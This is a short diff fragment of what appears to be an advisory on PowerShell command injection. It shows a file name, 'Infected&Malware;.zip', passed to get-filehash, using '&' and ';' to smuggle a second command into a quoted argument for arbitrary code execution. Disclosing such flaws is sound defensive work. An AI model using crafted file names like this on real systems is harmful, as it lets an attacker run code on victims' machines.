@@ -8,7 +8,7 @@ Bypassing single quotes obstacle in PowerShell for code exec and bonus PS Window
 Semicolon and friend "&" operator join forces for arbitrary code exec capabilities. <br>
 
 Run some unwanted malware: <br>
-C:\Users\gg\Downloads>powershell get-filehash  'Infected&ScanMe;.zip'  -algorithm  md5 <br>
+C:\Users\gg\Downloads>powershell get-filehash  'Infected&Malware;.zip'  -algorithm  md5 <br>
 
 OR <br>
 
